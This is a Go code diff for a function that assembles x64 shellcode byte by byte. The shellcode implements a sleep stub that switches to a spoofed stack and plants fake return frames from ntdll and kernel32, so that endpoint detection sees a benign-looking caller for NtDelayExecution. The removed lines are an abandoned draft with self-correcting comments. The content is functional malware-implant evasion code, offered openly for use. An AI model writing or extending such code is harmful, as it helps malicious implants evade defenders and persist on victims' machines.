@@ -321,109 +321,6 @@ func findRetGadget(addr uintptr, skip, maxScan int) uintptr {
 func generateSleepStub() []byte {
 	var code []byte
 
-	// Prologue: save callee-saved registers and data pointer
-	// push rbp
-	code = append(code, 0x55)
-	// mov rbp, rsp
-	code = append(code, 0x48, 0x89, 0xE5)
-	// push rbx (we'll use rbx to hold data pointer)
-	code = append(code, 0x53)
-	// push r12
-	code = append(code, 0x41, 0x54)
-	// push r13
-	code = append(code, 0x41, 0x55)
-	// sub rsp, 0x20 (shadow space + alignment, total frame = push×4 + sub = 32+32 = 64, aligned)
-	code = append(code, 0x48, 0x83, 0xEC, 0x20)
-	// mov rbx, rcx (save data pointer in rbx — callee-saved)
-	code = append(code, 0x48, 0x89, 0xCB)
-
-	waitLoopOffset := len(code)
-
-	// --- WAIT FOR SLEEP SIGNAL ---
-	// WaitForSingleObject(data->sleep_event, INFINITE)
-	// mov rcx, [rbx + SLEEP_EVENT_OFF]
-	code = append(code, 0x48, 0x8B, 0x4B, byte(dataOffSleepEvent))
-	// mov edx, 0xFFFFFFFF (INFINITE)
-	code = append(code, 0xBA)
-	code = append(code, 0xFF, 0xFF, 0xFF, 0xFF)
-	// call [rbx + WAITFORSINGLEOBJ_OFF]
-	code = append(code, 0xFF, 0x53, byte(dataOffWaitForSingleObj))
-
-	// --- SAVE REAL RSP ---
-	// mov [rbx + SAVED_RSP_OFF], rsp
-	code = append(code, 0x48, 0x89, 0x63, byte(dataOffSavedRSP))
-
-	// --- SWITCH TO SPOOFED STACK ---
-	// mov rsp, [rbx + SPOOF_STACK_TOP_OFF]
-	code = append(code, 0x48, 0x8B, 0x63, byte(dataOffSpoofStackTop))
-
-	// --- BUILD FAKE RETURN ADDRESS FRAMES (bottom-up) ---
-	// Frame 3: ntdll!RtlUserThreadStart ret gadget (bottom of chain)
-	// push [rbx + RET_GADGET3_OFF]
-	code = append(code, 0xFF, 0x73, byte(dataOffRetGadget3))
-	// sub rsp, 0x20 (simulate shadow space)
-	code = append(code, 0x48, 0x83, 0xEC, 0x20)
-
-	// Frame 2: kernel32!BaseThreadInitThunk ret gadget
-	// push [rbx + RET_GADGET2_OFF]
-	code = append(code, 0xFF, 0x73, byte(dataOffRetGadget2))
-	// sub rsp, 0x20
-	code = append(code, 0x48, 0x83, 0xEC, 0x20)
-
-	// Frame 1: kernel32!SleepEx ret gadget (top frame above NtDelayExecution)
-	// This is what EDR sees as the "caller" of NtDelayExecution
-	// push [rbx + RET_GADGET1_OFF]
-	code = append(code, 0xFF, 0x73, byte(dataOffRetGadget1))
-
-	// --- SAVE POST-SLEEP RETURN ADDRESS ---
-	// We need to regain control after NtDelayExecution returns. The syscall;ret
-	// gadget will pop RSP+0 (which is retGadget1 = kernel32 ret). That ret will
-	// pop the next value. We push our post_sleep address there.
-	//
-	// Stack layout at syscall time:
-	//   RSP+0x00: retGadget1 (kernel32 ret) ← syscall;ret returns here
-	//   RSP+0x08: post_sleep_addr          ← retGadget1's ret jumps here
-	//   RSP+0x10: [shadow junk]
-	//   RSP+0x28: retGadget2               ← visible to stack walker as frame 2
-	//   RSP+0x48: [shadow junk]
-	//   RSP+0x50: retGadget3               ← visible to stack walker as frame 3
-	//
-	// After wakeup: syscall;ret → retGadget1(ret) → post_sleep → we restore RSP
-
-	// Record current position for the post_sleep lea below
-	// lea r12, [rip + post_sleep] — we'll patch the offset
-	leaR12Offset := len(code)
-	code = append(code, 0x4C, 0x8D, 0x25) // lea r12, [rip+disp32]
-	code = append(code, 0x00, 0x00, 0x00, 0x00) // placeholder disp32
-
-	// push r12 (post_sleep address goes at RSP+0x08 after retGadget1 is pushed above)
-	// Wait — retGadget1 was pushed first, so it's at the TOP (lowest address).
-	// We need post_sleep UNDER retGadget1. Let me restructure:
-	//
-	// What we want on the spoofed stack (growing downward):
-	//   [high addr, pushed first]
-	//   retGadget3          ← frame 3
-	//   shadow (0x20)
-	//   retGadget2          ← frame 2
-	//   shadow (0x20)
-	//   post_sleep_addr     ← retGadget1's ret will pop this
-	//   retGadget1          ← syscall;ret will pop this (TOP of stack = RSP)
-	//
-	// Push order (stack grows DOWN, first push = highest address):
-	// push retGadget3, sub 0x20, push retGadget2, sub 0x20, push post_sleep, push retGadget1
-
-	// Oops, I already generated the wrong order above. Let me redo this.
-	// Let me clear and regenerate from the spoof stack section.
-
-	// Clear everything from "BUILD FAKE RETURN ADDRESS FRAMES" onwards
-	code = code[:len(code)-len(code)+waitLoopOffset+19] // back up to after "SAVE REAL RSP" + "SWITCH TO SPOOFED STACK"
-
-	// Actually, let me just regenerate cleanly. The problem is that I need careful
-	// control over the push order. Let me restart the code generation.
-	code = nil
-
-	// === REGENERATE FULL STUB ===
-
 	// Prologue
 	code = append(code, 0x55)                   // push rbp
 	code = append(code, 0x48, 0x89, 0xE5)       // mov rbp, rsp
@@ -435,7 +332,7 @@ func generateSleepStub() []byte {
 	code = append(code, 0x48, 0x89, 0xCB) // mov rbx, rcx
 
 	// === WAIT LOOP ===
-	waitLoopOffset = len(code)
+	waitLoopOffset := len(code)
 
 	// WaitForSingleObject(sleep_event, INFINITE)
 	code = append(code, 0x48, 0x8B, 0x4B, byte(dataOffSleepEvent)) // mov rcx, [rbx+off]
@@ -458,7 +355,7 @@ func generateSleepStub() []byte {
 	code = append(code, 0x48, 0x83, 0xEC, 0x20)                   // sub rsp, 0x20 (shadow)
 
 	// post_sleep return address (retGadget1's ret will pop this)
-	leaR12Offset = len(code)
+	leaR12Offset := len(code)
 	code = append(code, 0x4C, 0x8D, 0x25)       // lea r12, [rip+disp32]
 	code = append(code, 0x00, 0x00, 0x00, 0x00)  // placeholder
 	code = append(code, 0x41, 0x54)               // push r12
